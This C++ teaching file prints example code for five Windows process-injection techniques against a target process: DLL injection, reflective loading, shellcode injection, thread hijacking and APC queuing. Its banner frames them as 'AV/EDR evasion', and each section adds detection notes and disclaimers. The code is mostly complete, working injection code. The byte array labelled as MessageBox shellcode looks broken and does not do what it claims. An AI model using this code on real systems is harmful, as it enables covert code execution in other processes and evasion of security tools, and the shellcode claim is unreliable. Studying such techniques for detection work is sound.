/**
 * code_injection.cpp
 * 
 * This module demonstrates various code injection techniques used to
 * execute code in the context of another process.
 * 
 * EDUCATIONAL PURPOSE ONLY: This code is for learning about security concepts.
 * Using these techniques against systems without authorization is illegal.
 */

#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <vector>

// Function to find a process ID by name
DWORD findProcessId(const std::string& processName) {
    DWORD processId = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 processEntry;
        processEntry.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(snapshot, &processEntry)) {
            do {
                if (processName == processEntry.szExeFile) {
                    processId = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(snapshot, &processEntry));
        }
        CloseHandle(snapshot);
    }
    
    return processId;
}

/**
 * @brief Demonstrates classic DLL injection using LoadLibrary
 * 
 * This technique injects a DLL into a target process by calling
 * LoadLibrary in the context of that process.
 */
void demonstrateDllInjection() {
    std::cout << "=== DLL Injection using LoadLibrary ===" << std::endl;
    
    std::cout << "This technique works as follows:" << std::endl;
    std::cout << "1. Open a handle to the target process" << std::endl;
    std::cout << "2. Allocate memory in the target process" << std::endl;
    std::cout << "3. Write the DLL path to the allocated memory" << std::endl;
    std::cout << "4. Create a remote thread that calls LoadLibrary with the DLL path" << std::endl;
    std::cout << std::endl;
    
    std::cout << "Example code (will not execute):" << std::endl;
    std::cout << R"(
    // Target process name
    std::string targetProcess = "notepad.exe";
    // Path to the DLL to inject
    std::string dllPath = "C:\\path\\to\\your\\dll.dll";
    
    // Find the process ID
    DWORD processId = findProcessId(targetProcess);
    if (processId == 0) {
        std::cout << "Target process not found" << std::endl;
        return;
    }
    
    // Open the process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        std::cout << "Failed to open process" << std::endl;
        return;
    }
    
    // Allocate memory in the target process
    LPVOID remoteBuffer = VirtualAllocEx(
        hProcess, 
        NULL, 
        dllPath.length() + 1, 
        MEM_COMMIT, 
        PAGE_READWRITE
    );
    
    if (remoteBuffer == NULL) {
        std::cout << "Failed to allocate memory in target process" << std::endl;
        CloseHandle(hProcess);
        return;
    }
    
    // Write the DLL path to the allocated memory
    if (!WriteProcessMemory(
        hProcess, 
        remoteBuffer, 
        dllPath.c_str(), 
        dllPath.length() + 1, 
        NULL
    )) {
        std::cout << "Failed to write to target process memory" << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }
    
    // Get the address of LoadLibraryA
    FARPROC loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    
    // Create a remote thread that calls LoadLibraryA with the DLL path
    HANDLE hThread = CreateRemoteThread(
        hProcess, 
        NULL, 
        0, 
        (LPTHREAD_START_ROUTINE)loadLibraryAddr, 
        remoteBuffer, 
        0, 
        NULL
    );
    
    if (hThread == NULL) {
        std::cout << "Failed to create remote thread" << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }
    
    // Wait for the thread to complete
    WaitForSingleObject(hThread, INFINITE);
    
    // Clean up
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    std::cout << "DLL injected successfully" << std::endl;
    )" << std::endl;
    
    std::cout << "Detection: This technique is well-known and easily detected by modern EDR solutions." << std::endl;
    std::cout << "It leaves artifacts such as:" << std::endl;
    std::cout << "- LoadLibrary call from a remote thread" << std::endl;
    std::cout << "- Suspicious memory allocations" << std::endl;
    std::cout << "- DLL loaded without a normal load reason" << std::endl;
    std::cout << std::endl;
}

/**
 * @brief Demonstrates reflective DLL injection
 * 
 * This technique loads a DLL from memory without calling LoadLibrary,
 * making it harder to detect.
 */
void demonstrateReflectiveDllInjection() {
    std::cout << "=== Reflective DLL Injection ===" << std::endl;
    
    std::cout << "Reflective DLL injection loads a DLL from memory without using LoadLibrary." << std::endl;
    std::cout << "This technique:" << std::endl;
    std::cout << "1. Manually maps the DLL into the target process" << std::endl;
    std::cout << "2. Resolves imports and relocations" << std::endl;
    std::cout << "3. Calls the DLL entry point" << std::endl;
    std::cout << std::endl;
    
    std::cout << "This is a complex technique that requires:" << std::endl;
    std::cout << "- Understanding of the PE file format" << std::endl;
    std::cout << "- Manual implementation of the Windows loader" << std::endl;
    std::cout << "- Special modifications to the DLL" << std::endl;
    std::cout << std::endl;
    
    std::cout << "A simplified overview of the process:" << std::endl;
    std::cout << R"(
    // 1. Read the DLL file into memory
    // 2. Parse the PE headers
    // 3. Allocate memory in the target process
    // 4. Copy the DLL sections to the target process
    // 5. Perform base relocations
    // 6. Resolve imports
    // 7. Call the DLL entry point
    
    // This is a highly simplified example - actual implementation is much more complex
    
    // Allocate memory for the DLL in the target process
    LPVOID baseAddress = VirtualAllocEx(
        hProcess,
        NULL,
        dllSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    // Copy the DLL headers
    WriteProcessMemory(
        hProcess,
        baseAddress,
        dllData,
        headerSize,
        NULL
    );
    
    // Copy each section
    for (each section in the DLL) {
        WriteProcessMemory(
            hProcess,
            (BYTE*)baseAddress + section.VirtualAddress,
            (BYTE*)dllData + section.PointerToRawData,
            section.SizeOfRawData,
            NULL
        );
    }
    
    // Process relocations
    // Resolve imports
    
    // Create a thread to call the entry point
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)((BYTE*)baseAddress + entryPointRVA),
        baseAddress,  // DLL_PROCESS_ATTACH
        0,
        NULL
    );
    )" << std::endl;
    
    std::cout << "Detection: This technique is harder to detect than standard DLL injection," << std::endl;
    std::cout << "but modern EDR solutions look for:" << std::endl;
    std::cout << "- Memory regions with RWX permissions" << std::endl;
    std::cout << "- PE headers in process memory" << std::endl;
    std::cout << "- Suspicious memory allocations followed by writes" << std::endl;
    std::cout << std::endl;
}

/**
 * @brief Demonstrates shellcode injection
 * 
 * This technique injects and executes raw shellcode in a target process.
 */
void demonstrateShellcodeInjection() {
    std::cout << "=== Shellcode Injection ===" << std::endl;
    
    std::cout << "Shellcode injection involves injecting raw executable code into a process." << std::endl;
    std::cout << "This technique:" << std::endl;
    std::cout << "1. Allocates memory in the target process" << std::endl;
    std::cout << "2. Writes the shellcode to the allocated memory" << std::endl;
    std::cout << "3. Creates a thread to execute the shellcode" << std::endl;
    std::cout << std::endl;
    
    std::cout << "Example code (will not execute):" << std::endl;
    std::cout << R"(
    // Example shellcode (MessageBox)
    unsigned char shellcode[] = {
        0x31, 0xd2, 0xb2, 0x00, 0x31, 0xc9, 0x51, 0x68, 0x61, 0x6c, 0x6f, 0x01,
        0x68, 0x48, 0x65, 0x6c, 0x6c, 0x89, 0xe1, 0x51, 0x68, 0x61, 0x67, 0x65, 0x01,
        0x68, 0x4d, 0x65, 0x73, 0x73, 0x89, 0xe3, 0x31, 0xc0, 0x50, 0x53, 0x51, 0x52,
        0xb8, 0x00, 0x00, 0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0xc3
    };
    
    // Find the process ID
    DWORD processId = findProcessId("notepad.exe");
    if (processId == 0) {
        std::cout << "Target process not found" << std::endl;
        return;
    }
    
    // Open the process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        std::cout << "Failed to open process" << std::endl;
        return;
    }
    
    // Allocate memory in the target process
    LPVOID remoteBuffer = VirtualAllocEx(
        hProcess, 
        NULL, 
        sizeof(shellcode), 
        MEM_COMMIT, 
        PAGE_EXECUTE_READWRITE
    );
    
    if (remoteBuffer == NULL) {
        std::cout << "Failed to allocate memory in target process" << std::endl;
        CloseHandle(hProcess);
        return;
    }
    
    // Write the shellcode to the allocated memory
    if (!WriteProcessMemory(
        hProcess, 
        remoteBuffer, 
        shellcode, 
        sizeof(shellcode), 
        NULL
    )) {
        std::cout << "Failed to write to target process memory" << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }
    
    // Create a remote thread to execute the shellcode
    HANDLE hThread = CreateRemoteThread(
        hProcess, 
        NULL, 
        0, 
        (LPTHREAD_START_ROUTINE)remoteBuffer, 
        NULL, 
        0, 
        NULL
    );
    
    if (hThread == NULL) {
        std::cout << "Failed to create remote thread" << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }
    
    // Wait for the thread to complete
    WaitForSingleObject(hThread, INFINITE);
    
    // Clean up
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    )" << std::endl;
    
    std::cout << "Detection: Modern EDR solutions detect this technique by monitoring:" << std::endl;
    std::cout << "- Memory allocations with execute permissions" << std::endl;
    std::cout << "- WriteProcessMemory followed by CreateRemoteThread" << std::endl;
    std::cout << "- Execution from recently allocated memory" << std::endl;
    std::cout << std::endl;
}

/**
 * @brief Demonstrates thread hijacking
 * 
 * This technique hijacks an existing thread in the target process
 * instead of creating a new one.
 */
void demonstrateThreadHijacking() {
    std::cout << "=== Thread Hijacking ===" << std::endl;
    
    std::cout << "Thread hijacking avoids creating new threads by hijacking existing ones." << std::endl;
    std::cout << "This technique:" << std::endl;
    std::cout << "1. Suspends an existing thread in the target process" << std::endl;
    std::cout << "2. Modifies its context (registers, instruction pointer)" << std::endl;
    std::cout << "3. Resumes the thread to execute the injected code" << std::endl;
    std::cout << std::endl;
    
    std::cout << "Example code (will not execute):" << std::endl;
    std::cout << R"(
    // Find a thread in the target process
    THREADENTRY32 threadEntry;
    threadEntry.dwSize = sizeof(THREADENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    
    DWORD threadId = 0;
    if (Thread32First(snapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == processId) {
                threadId = threadEntry.th32ThreadID;
                break;
            }
        } while (Thread32Next(snapshot, &threadEntry));
    }
    CloseHandle(snapshot);
    
    if (threadId == 0) {
        std::cout << "No threads found in target process" << std::endl;
        return;
    }
    
    // Open the thread
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);
    if (hThread == NULL) {
        std::cout << "Failed to open thread" << std::endl;
        return;
    }
    
    // Suspend the thread
    SuspendThread(hThread);
    
    // Get the thread context
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &context)) {
        std::cout << "Failed to get thread context" << std::endl;
        ResumeThread(hThread);
        CloseHandle(hThread);
        return;
    }
    
    // Allocate memory for shellcode
    LPVOID remoteBuffer = VirtualAllocEx(
        hProcess, 
        NULL, 
        sizeof(shellcode), 
        MEM_COMMIT, 
        PAGE_EXECUTE_READWRITE
    );
    
    // Write shellcode to the allocated memory
    WriteProcessMemory(
        hProcess, 
        remoteBuffer, 
        shellcode, 
        sizeof(shellcode), 
        NULL
    );
    
    // Save the original instruction pointer
    DWORD64 originalRip = context.Rip;
    
    // Modify the instruction pointer to point to our shellcode
    context.Rip = (DWORD64)remoteBuffer;
    
    // Update the thread context
    if (!SetThreadContext(hThread, &context)) {
        std::cout << "Failed to set thread context" << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        return;
    }
    
    // Resume the thread
    ResumeThread(hThread);
    
    // Note: In a real implementation, you would need to:
    // 1. Make sure the shellcode returns to the original instruction pointer
    // 2. Handle stack alignment and cleanup
    // 3. Preserve all registers
    )" << std::endl;
    
    std::cout << "Detection: This technique is harder to detect than creating new threads," << std::endl;
    std::cout << "but modern EDR solutions monitor:" << std::endl;
    std::cout << "- Thread suspensions followed by context modifications" << std::endl;
    std::cout << "- Unusual instruction pointer changes" << std::endl;
    std::cout << "- Execution flow deviations" << std::endl;
    std::cout << std::endl;
}

/**
 * @brief Demonstrates APC injection
 * 
 * This technique uses Asynchronous Procedure Calls to execute
 * code in the context of another process.
 */
void demonstrateAPCInjection() {
    std::cout << "=== APC Injection ===" << std::endl;
    
    std::cout << "APC (Asynchronous Procedure Call) injection queues code to be executed" << std::endl;
    std::cout << "when a thread enters an alertable state." << std::endl;
    std::cout << std::endl;
    
    std::cout << "This technique:" << std::endl;
    std::cout << "1. Allocates memory in the target process" << std::endl;
    std::cout << "2. Writes shellcode to the allocated memory" << std::endl;
    std::cout << "3. Queues an APC to a thread in the target process" << std::endl;
    std::cout << std::endl;
    
    std::cout << "Example code (will not execute):" << std::endl;
    std::cout << R"(
    // Find all threads in the target process
    std::vector<DWORD> threadIds;
    THREADENTRY32 threadEntry;
    threadEntry.dwSize = sizeof(THREADENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    
    if (Thread32First(snapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == processId) {
                threadIds.push_back(threadEntry.th32ThreadID);
            }
        } while (Thread32Next(snapshot, &threadEntry));
    }
    CloseHandle(snapshot);
    
    if (threadIds.empty()) {
        std::cout << "No threads found in target process" << std::endl;
        return;
    }
    
    // Allocate memory for shellcode
    LPVOID remoteBuffer = VirtualAllocEx(
        hProcess, 
        NULL, 
        sizeof(shellcode), 
        MEM_COMMIT, 
        PAGE_EXECUTE_READWRITE
    );
    
    // Write shellcode to the allocated memory
    WriteProcessMemory(
        hProcess, 
        remoteBuffer, 
        shellcode, 
        sizeof(shellcode), 
        NULL
    );
    
    // Queue an APC to each thread
    for (DWORD threadId : threadIds) {
        HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);
        if (hThread) {
            // Queue the APC
            if (QueueUserAPC(
                (PAPCFUNC)remoteBuffer, 
                hThread, 
                0
            )) {
                std::cout << "APC queued to thread " << threadId << std::endl;
            }
            CloseHandle(hThread);
        }
    }
    
    // Note: The APC will only execute when the thread enters an alertable state
    // (e.g., by calling SleepEx, WaitForSingleObjectEx, etc.)
    )" << std::endl;
    
    std::cout << "Detection: This technique can be detected by monitoring:" << std::endl;
    std::cout << "- QueueUserAPC calls to threads in other processes" << std::endl;
    std::cout << "- Memory allocations with execute permissions" << std::endl;
    std::cout << "- Execution from recently allocated memory" << std::endl;
    std::cout << std::endl;
}

int main() {
    std::cout << "Code Injection Techniques for AV/EDR Evasion" << std::endl;
    std::cout << "=============================================" << std::endl;
    std::cout << std::endl;
    
    demonstrateDllInjection();
    demonstrateReflectiveDllInjection();
    demonstrateShellcodeInjection();
    demonstrateThreadHijacking();
    demonstrateAPCInjection();
    
    std::cout << "IMPORTANT NOTES:" << std::endl;
    std::cout << "1. These techniques are for educational purposes only" << std::endl;
    std::cout << "2. Modern EDR solutions can detect most of these techniques" << std::endl;
    std::cout << "3. Understanding these techniques helps in building better defenses" << std::endl;
    std::cout << "4. Always obtain proper authorization before testing security controls" << std::endl;
    
    return 0;
}

